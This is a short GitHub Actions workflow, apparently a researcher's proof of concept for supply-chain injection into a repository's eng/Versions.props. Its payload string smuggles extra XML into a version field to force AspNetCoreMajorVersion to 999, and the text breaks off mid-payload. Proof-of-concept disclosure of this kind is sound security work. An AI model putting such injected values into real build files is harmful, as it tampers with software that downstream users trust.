name: "Exploit PoC: Supply Chain Injection"
# Researcher: HackerMD
# Impact: Unauthorized modification of eng/Versions.props

on:
  workflow_dispatch:

jobs:
  supply-chain-poisoning:
    name: "Simulate Supply Chain Attack"
    runs-on: ubuntu-latest
    steps:
      - name: "Clone Repository"
        uses: actions/checkout@v4

      - name: "Inject Malicious Metadata"
        id: metadata
        run: |
          # This simulates a poisoned version from an untrusted source
          PAYLOAD='1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
